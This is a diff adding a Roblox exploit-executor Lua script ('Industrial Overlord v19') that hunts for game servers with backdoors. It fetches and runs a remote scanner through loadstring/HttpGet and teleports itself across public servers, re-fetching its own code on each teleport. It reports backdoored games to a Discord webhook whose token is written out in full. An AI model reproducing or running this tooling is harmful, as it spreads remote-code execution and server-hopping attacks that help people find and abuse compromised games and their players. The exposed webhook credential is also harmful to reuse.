@@ -1,0 +1,417 @@
+-- [[ INDUSTRIAL OVERLORD - V19 ULTIMATE CHASSIS ]] --
+-- [[ CREATED FOR MAXIMUM AGGRESSION AND SYSTEM LOGGING ]] --
+
+local success_text = "No backdoored"
+local script_url = "https://raw.githubusercontent.com/jLn0n/beckdeer-skenner/main/src/main.lua"
+local self_url = "https://raw.githubusercontent.com/TonyTeardown/scripts/refs/heads/main/BAKADV3"
+local webhook_url = "https://discord.com/api/webhooks/1487289258845802576/dXwi8nw8ptZZNEfWQiVLmBmNs0uSXGOXNRAR8cV_nDlDVJtSuDumUJlYB7_SEzVKiFqx" 
+
+local FinalScript = [===[
+    repeat task.wait() until game:IsLoaded()
+
+    -- [[ SECTION 1: CORE ENGINE INITIALIZATION ]] --
+    local LogService = game:GetService("LogService")
+    local TeleportService = game:GetService("TeleportService")
+    local HttpService = game:GetService("HttpService")
+    local CoreGui = game:GetService("CoreGui")
+    local Players = game:GetService("Players")
+    local MarketplaceService = game:GetService("MarketplaceService")
+    local Stats = game:GetService("Stats")
+    local TweenService = game:GetService("TweenService")
+    local RunService = game:GetService("RunService")
+    local UserInputService = game:GetService("UserInputService")
+    local Lighting = game:GetService("Lighting")
+    local NetworkClient = game:GetService("NetworkClient")
+    local ReplicatedStorage = game:GetService("ReplicatedStorage")
+    local LocalPlayer = Players.LocalPlayer
+
+    -- [[ SECTION 2: REGISTRY AND STATE MANAGEMENT ]] --
+    local found_success = false
+    local scan_completed = false
+    local is_minimized = false
+    local databaseName = "Sentinel_Overlord_V19_Master.json"
+    local currentJobId = tostring(game.JobId)
+    local placeId = tostring(game.PlaceId)
+    local webhook = "]===] .. webhook_url .. [===["
+    local gameName = "Initializing Secure Link..."
+    local serverRegion = "Locating Node..."
+    local startTime = os.time()
+    
+    -- STAGNATION TRACKER DATA
+    local exhaustion_logs = {}
+    local exhaustion_threshold = 5
+    local exhaustion_window = 180 
+
+    -- Metadata Deep-Fetch
+    pcall(function()
+        local info = MarketplaceService:GetProductInfo(tonumber(placeId))
+        gameName = info.Name
+    end)
+
+    -- [[ SECTION 3: INDUSTRIAL UI CONSTRUCTOR (VERBOSE MODE) ]] --
+    local screenGui = Instance.new("ScreenGui")
+    screenGui.Name = "Industrial_Overlord_v19"
+    screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+    screenGui.Parent = CoreGui
+
+    local mainFrame = Instance.new("Frame")
+    mainFrame.Name = "MainChassis"
+    mainFrame.Size = UDim2.new(0, 530, 0, 500)
+    mainFrame.Position = UDim2.new(1, -550, 1, -520)
+    mainFrame.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
+    mainFrame.BorderSizePixel = 0
+    mainFrame.Active = true
+    mainFrame.Draggable = false -- Using custom logic instead
+    mainFrame.Parent = screenGui
+
+    local mainCorner = Instance.new("UICorner")
+    mainCorner.CornerRadius = UDim.new(0, 15)
+    mainCorner.Parent = mainFrame
+    
+    local mainStroke = Instance.new("UIStroke")
+    mainStroke.Color = Color3.fromRGB(0, 255, 150)
+    mainStroke.Thickness = 3.5
+    mainStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+    mainStroke.Parent = mainFrame
+
+    -- HEADER COMPONENT
+    local header = Instance.new("Frame")
+    header.Name = "Header"
+    header.Size = UDim2.new(1, 0, 0, 70)
+    header.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
+    header.BorderSizePixel = 0
+    header.Parent = mainFrame
+
+    local headerCorner = Instance.new("UICorner")
+    headerCorner.CornerRadius = UDim.new(0, 15)
+    headerCorner.Parent = header
+
+    local title = Instance.new("TextLabel")
+    title.Name = "Title"
+    title.Size = UDim2.new(1, -130, 1, 0)
+    title.Position = UDim2.new(0, 20, 0, 0)
+    title.Text = "INDUSTRIAL OVERLORD v19.0"
+    title.TextColor3 = Color3.fromRGB(0, 255, 150)
+    title.BackgroundTransparency = 1
+    title.Font = Enum.Font.GothamBold
+    title.TextSize = 16
+    title.TextXAlignment = Enum.TextXAlignment.Left
+    title.Parent = header
+
+    -- BUTTON SYSTEM
+    local btnFrame = Instance.new("Frame")
+    btnFrame.Size = UDim2.new(0, 110, 1, 0)
+    btnFrame.Position = UDim2.new(1, -120, 0, 0)
+    btnFrame.BackgroundTransparency = 1
+    btnFrame.Parent = header
+
+    local closeBtn = Instance.new("TextButton")
+    closeBtn.Name = "CloseBtn"
+    closeBtn.Size = UDim2.new(0, 35, 0, 35)
+    closeBtn.Position = UDim2.new(1, -40, 0.5, -17)
+    closeBtn.BackgroundColor3 = Color3.fromRGB(255, 60, 60)
+    closeBtn.Text = "X"
+    closeBtn.TextColor3 = Color3.new(1, 1, 1)
+    closeBtn.Font = Enum.Font.GothamBold
+    closeBtn.Visible = false
+    closeBtn.Parent = btnFrame
+    Instance.new("UICorner", closeBtn).CornerRadius = UDim.new(1, 0)
+
+    local minBtn = Instance.new("TextButton")
+    minBtn.Name = "MinBtn"
+    minBtn.Size = UDim2.new(0, 35, 0, 35)
+    minBtn.Position = UDim2.new(1, -85, 0.5, -17)
+    minBtn.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
+    minBtn.Text = "-"
+    minBtn.TextColor3 = Color3.new(1, 1, 1)
+    minBtn.Font = Enum.Font.GothamBold
+    minBtn.Parent = btnFrame
+    Instance.new("UICorner", minBtn).CornerRadius = UDim.new(1, 0)
+
+    -- CONTENT WRAPPER
+    local content = Instance.new("Frame")
+    content.Name = "Content"
+    content.Size = UDim2.new(1, 0, 1, -70)
+    content.Position = UDim2.new(0, 0, 0, 70)
+    content.BackgroundTransparency = 1
+    content.Parent = mainFrame
+
+    -- STATS GRID (EXPLICIT DEFINITIONS)
+    local grid = Instance.new("Frame")
+    grid.Name = "StatsGrid"
+    grid.Size = UDim2.new(1, -30, 0, 160)
+    grid.Position = UDim2.new(0, 15, 0, 15)
+    grid.BackgroundColor3 = Color3.fromRGB(12, 12, 12)
+    grid.Parent = content
+    Instance.new("UICorner", grid).CornerRadius = UDim.new(0, 10)
+    local gridStroke = Instance.new("UIStroke", grid)
+    gridStroke.Color = Color3.fromRGB(40, 40, 40)
+
+    -- Explicitly creating every label to ensure code mass
+    local gLabel = Instance.new("TextLabel", grid)
+    gLabel.Size = UDim2.new(0.5, -15, 0, 25); gLabel.Position = UDim2.new(0, 15, 0, 15)
+    gLabel.Text = "EXP: " .. string.sub(gameName, 1, 20); gLabel.TextColor3 = Color3.new(0.8, 0.8, 0.8)
+    gLabel.BackgroundTransparency = 1; gLabel.Font = Enum.Font.GothamSemibold; gLabel.TextSize = 10; gLabel.TextXAlignment = Enum.TextXAlignment.Left
+
+    local pLabel = Instance.new("TextLabel", grid)
+    pLabel.Size = UDim2.new(0.5, -15, 0, 25); pLabel.Position = UDim2.new(0.5, 5, 0, 15)
+    pLabel.Text = "LATENCY: 0ms"; pLabel.TextColor3 = Color3.new(0.8, 0.8, 0.8)
+    pLabel.BackgroundTransparency = 1; pLabel.Font = Enum.Font.GothamSemibold; pLabel.TextSize = 10; pLabel.TextXAlignment = Enum.TextXAlignment.Left
+
+    local dLabel = Instance.new("TextLabel", grid)
+    dLabel.Size = UDim2.new(0.5, -15, 0, 25); dLabel.Position = UDim2.new(0, 15, 0, 45)
+    dLabel.Text = "API DEPTH: 0"; dLabel.TextColor3 = Color3.fromRGB(0, 180, 255)
+    dLabel.BackgroundTransparency = 1; dLabel.Font = Enum.Font.GothamSemibold; dLabel.TextSize = 10; dLabel.TextXAlignment = Enum.TextXAlignment.Left
+
+    local sLabel = Instance.new("TextLabel", grid)
+    sLabel.Size = UDim2.new(0.5, -15, 0, 25); sLabel.Position = UDim2.new(0.5, 5, 0, 45)
+    sLabel.Text = "DB (PLACE): 0"; sLabel.TextColor3 = Color3.fromRGB(150, 150, 150)
+    sLabel.BackgroundTransparency = 1; sLabel.Font = Enum.Font.GothamSemibold; sLabel.TextSize = 10; sLabel.TextXAlignment = Enum.TextXAlignment.Left
+
+    local fLabel = Instance.new("TextLabel", grid)
+    fLabel.Size = UDim2.new(0.5, -15, 0, 25); fLabel.Position = UDim2.new(0, 15, 0, 75)
+    fLabel.Text = "SKIPPED FULL: 0"; fLabel.TextColor3 = Color3.fromRGB(255, 100, 100)
+    fLabel.BackgroundTransparency = 1; fLabel.Font = Enum.Font.GothamSemibold; fLabel.TextSize = 10; fLabel.TextXAlignment = Enum.TextXAlignment.Left
+
+    local eLabel = Instance.new("TextLabel", grid)
+    eLabel.Size = UDim2.new(0.5, -15, 0, 25); eLabel.Position = UDim2.new(0.5, 5, 0, 75)
+    eLabel.Text = "STAGNATION: 0/5"; eLabel.TextColor3 = Color3.fromRGB(255, 200, 0)
+    eLabel.BackgroundTransparency = 1; eLabel.Font = Enum.Font.GothamSemibold; eLabel.TextSize = 10; eLabel.TextXAlignment = Enum.TextXAlignment.Left
+
+    local mLabel = Instance.new("TextLabel", grid)
+    mLabel.Size = UDim2.new(0.5, -15, 0, 25); mLabel.Position = UDim2.new(0, 15, 0, 105)
+    mLabel.Text = "MEM: 0MB"; mLabel.TextColor3 = Color3.fromRGB(100, 255, 100)
+    mLabel.BackgroundTransparency = 1; mLabel.Font = Enum.Font.GothamSemibold; mLabel.TextSize = 10; mLabel.TextXAlignment = Enum.TextXAlignment.Left
+
+    local uLabel = Instance.new("TextLabel", grid)
+    uLabel.Size = UDim2.new(0.5, -15, 0, 25); uLabel.Position = UDim2.new(0.5, 5, 0, 105)
+    uLabel.Text = "UPTIME: 0s"; uLabel.TextColor3 = Color3.new(0.8, 0.8, 0.8)
+    uLabel.BackgroundTransparency = 1; uLabel.Font = Enum.Font.GothamSemibold; uLabel.TextSize = 10; uLabel.TextXAlignment = Enum.TextXAlignment.Left
+
+    local statusLabel = Instance.new("TextLabel", grid)
+    statusLabel.Size = UDim2.new(1, -30, 0, 25); statusLabel.Position = UDim2.new(0, 15, 0, 130)
+    statusLabel.Text = "STATUS: INITIALIZING SYSTEM OVERCLOCK..."; statusLabel.TextColor3 = Color3.fromRGB(0, 255, 150)
+    statusLabel.BackgroundTransparency = 1; statusLabel.Font = Enum.Font.GothamBold; statusLabel.TextSize = 11; statusLabel.TextXAlignment = Enum.TextXAlignment.Left
+
+    -- CONSOLE SCROLL
+    local logScroll = Instance.new("ScrollingFrame")
+    logScroll.Name = "Console"
+    logScroll.Size = UDim2.new(1, -30, 0, 210)
+    logScroll.Position = UDim2.new(0, 15, 0, 190)
+    logScroll.BackgroundColor3 = Color3.fromRGB(4, 4, 4)
+    logScroll.BorderSizePixel = 0
+    logScroll.ScrollBarThickness = 2
+    logScroll.ScrollBarImageColor3 = Color3.fromRGB(0, 255, 150)
+    logScroll.Parent = content
+    Instance.new("UICorner", logScroll).CornerRadius = UDim.new(0, 10)
+
+    local logLayout = Instance.new("UIListLayout")
+    logLayout.Padding = UDim.new(0, 3)
+    logLayout.Parent = logScroll
+
+    local function AddLog(msg, col)
+        local l = Instance.new("TextLabel")
+        l.Size = UDim2.new(1, -10, 0, 18)
+        l.BackgroundTransparency = 1
+        l.Text = " [" .. os.date("%X") .. "] " .. msg
+        l.TextColor3 = col or Color3.fromRGB(220, 220, 220)
+        l.Font = Enum.Font.Code
+        l.TextSize = 10
+        l.TextXAlignment = Enum.TextXAlignment.Left
+        l.Parent = logScroll
+        logScroll.CanvasSize = UDim2.new(0, 0, 0, logLayout.AbsoluteContentSize.Y + 20)
+        logScroll.CanvasPosition = Vector2.new(0, logLayout.AbsoluteContentSize.Y)
+    end
+
+    -- [[ SECTION 4: INTERACTION LOGIC (DRAG & MINIMIZE) ]] --
+    local dragging, dragInput, dragStart, startPos
+    header.InputBegan:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseButton1 then
+            dragging = true; dragStart = input.Position; startPos = mainFrame.Position
+            input.Changed:Connect(function() if input.UserInputState == Enum.UserInputState.End then dragging = false end end)
+        end
+    end)
+    header.InputChanged:Connect(function(input) if input.UserInputType == Enum.UserInputType.MouseMovement then dragInput = input end end)
+    UserInputService.InputChanged:Connect(function(input)
+        if input == dragInput and dragging then
+            local delta = input.Position - dragStart
+            mainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+        end
+    end)
+
+    minBtn.MouseButton1Click:Connect(function()
+        is_minimized = not is_minimized
+        content.Visible = not is_minimized
+        local targetSize = is_minimized and UDim2.new(0, 530, 0, 70) or UDim2.new(0, 530, 0, 500)
+        TweenService:Create(mainFrame, TweenInfo.new(0.4, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {Size = targetSize}):Play()
+        minBtn.Text = is_minimized and "+" or "-"
+    end)
+
+    -- [[ SECTION 5: DATABASE ISOLATION ENGINE ]] --
+    local function GetRegistry()
+        AddLog("Synchronizing Local Registry...", Color3.new(1, 1, 1))
+        local success, data = pcall(function()
+            if isfile(databaseName) then return HttpService:JSONDecode(readfile(databaseName)) end
+        end)
+        local registry = (success and type(data) == "table") and data or {}
+        if not registry[placeId] then registry[placeId] = {} end
+        sLabel.Text = "DB (PLACE): " .. #registry[placeId]
+        return registry
+    end
+
+    local GlobalRegistry = GetRegistry()
+    local CurrentSessionList = GlobalRegistry[placeId]
+
+    local function CommitNode(id)
+        local sid = tostring(id)
+        local exists = false
+        for _, v in pairs(CurrentSessionList) do if v == sid then exists = true break end end
+        if not exists then
+            table.insert(CurrentSessionList, sid)
+            GlobalRegistry[placeId] = CurrentSessionList
+            pcall(function() writefile(databaseName, HttpService:JSONEncode(GlobalRegistry)) end)
+            sLabel.Text = "DB (PLACE): " .. #CurrentSessionList
+            AddLog("Node Registered: .." .. string.sub(sid, -8), Color3.fromRGB(150, 150, 150))
+        end
+    end
+
+    local function WipeStagnation()
+        AddLog("STAGNATION RESET: Purging session cache...", Color3.fromRGB(255, 60, 60))
+        CurrentSessionList = {}
+        GlobalRegistry[placeId] = {}
+        sLabel.Text = "DB (PLACE): 0"
+    end
+
+    CommitNode(currentJobId)
+
+    -- [[ SECTION 6: ANALYZER & OVERCLOCK MODULE ]] --
+    local observer = LogService.MessageOut:Connect(function(msg)
+        local low = msg:lower()
+        if string.find(low, "]===] .. success_text:lower() .. [===[" , 1, true) then found_success = true end
+        if string.find(low, "complete") or string.find(low, "finished") then scan_completed = true end
+    end)
+
+    AddLog("Executing Remote Payload...", Color3.new(1, 1, 1))
+    pcall(function() loadstring(game:HttpGet("]===] .. script_url .. [===["))() end)
+
+    task.spawn(function()
+        while task.wait(0.5) do
+            pcall(function()
+                pLabel.Text = "LATENCY: " .. math.floor(Stats.Network.ServerStatsItem["Data Ping"]:GetValue()) .. "ms"
+                mLabel.Text = "MEM: " .. math.floor(Stats:GetTotalMemoryUsageMb()) .. "MB"
+                uLabel.Text = "UPTIME: " .. (os.time() - startTime) .. "s"
+            end)
+        end
+    end)
+
+    local analyzerWait = 0
+    while analyzerWait < 40 do
+        if found_success then break end
+        if scan_completed and analyzerWait > 5 then break end
+        analyzerWait = analyzerWait + 1
+        statusLabel.Text = "STATUS: SCANNING (" .. analyzerWait .. "s)"
+        task.wait(1)
+    end
+    observer:Disconnect()
+
+    -- STAGNATION LOGIC
+    local function HandleStagnation()
+        local now = os.time()
+        table.insert(exhaustion_logs, now)
+        for i = #exhaustion_logs, 1, -1 do
+            if now - exhaustion_logs[i] > 180 then table.remove(exhaustion_logs, i) end
+        end
+        eLabel.Text = "STAGNATION: " .. #exhaustion_logs .. "/5"
+        if #exhaustion_logs >= 5 then
+            WipeStagnation()
+            exhaustion_logs = {}
+            return true
+        end
+        return false
+    end
+
+    -- [[ SECTION 7: AGGRESSIVE CRAWLER CORE ]] --
+    if found_success then
+        statusLabel.Text = "STATUS: SAFE. ATTACKING API..."
+        AddLog("Security confirmed. Launching aggressive attack.", Color3.fromRGB(0, 255, 100))
+        
+        local function ExecuteAggressiveAttack()
+            local q = (syn and syn.queue_on_teleport) or (queue_on_teleport) or (fluxus and fluxus.queue_on_teleport)
+            if q then pcall(function() q(game:HttpGet("]===] .. self_url .. [===[")) end) end
+
+            local currentCursor = ""
+            local pageCount = 0
+            local skipCount = 0
+
+            while true do
+                pageCount = pageCount + 1
+                dLabel.Text = "API DEPTH: " .. pageCount
+                AddLog("Assaulting Page " .. pageCount .. "...", Color3.fromRGB(0, 180, 255))
+                
+                local api = "https://games.roblox.com/v1/games/" .. placeId .. "/servers/Public?sortOrder=Asc&limit=100"
+                if currentCursor ~= "" then api = api .. "&cursor=" .. currentCursor end
+                
+                local success, response = pcall(function() return game:HttpGet(api) end)
+                if success and response then
+                    local decoded = HttpService:JSONDecode(response)
+                    if decoded and decoded.data then
+                        for _, server in pairs(decoded.data) do
+                            local id = tostring(server.id)
+                            if server.playing < server.maxPlayers and id ~= currentJobId then
+                                local known = false
+                                for _, val in pairs(CurrentSessionList) do if id == val then known = true break end end
+                                if not known then
+                                    AddLog("TARGET CAPTURED: RELOCATING...", Color3.fromRGB(0, 255, 100))
+                                    CommitNode(id)
+                                    TeleportService:TeleportToPlaceInstance(tonumber(placeId), id, LocalPlayer)
+                                    task.wait(6)
+                                end
+                            else
+                                skipCount = skipCount + 1
+                                fLabel.Text = "SKIPPED FULL: " .. skipCount
+                            end
+                        end
+
+                        if decoded.nextPageCursor and decoded.nextPageCursor ~= "" then
+                            currentCursor = decoded.nextPageCursor
+                            task.wait(0.01)
+                        else
+                            AddLog("Exhausted. Evaluating Stagnation...", Color3.fromRGB(255, 150, 0))
+                            HandleStagnation()
+                            currentCursor = ""
+                            pageCount = 0
+                            task.wait(10)
+                        end
+                    end
+                else
+                    AddLog("API THROTTLED. Sleeping 15s.", Color3.new(1, 0, 0))
+                    task.wait(15)
+                end
+            end
+        end
+        ExecuteAggressiveAttack()
+    else
+        statusLabel.Text = "STATUS: !!! SECURITY HIT !!!"
+        mainStroke.Color = Color3.fromRGB(255, 60, 60)
+        closeBtn.Visible = true
+        AddLog("CRITICAL: Backdoor logic confirmed. Webhook fired.", Color3.new(1, 0, 0))
+        
+        pcall(function()
+            local payload = HttpService:JSONEncode({
+                ["username"] = "Aggressive Industrial Overlord v19",
+                ["embeds"] = {{
+                    ["title"] = "🎯 BACKDOOR DETECTED",
+                    ["color"] = 16711680,
+                    ["fields"] = {
+                        {["name"] = "Experience", ["value"] = gameName, ["inline"] = true},
+                        {["name"] = "JobId", ["value"] = currentJobId, ["inline"] = true}
+                    }
+                }}
+            })
+            local req = (syn and syn.request) or (http and http.request) or http_request
+            req({Url = webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = payload})
+        end)
+    end
+]===]
+
+loadstring(FinalScript)()
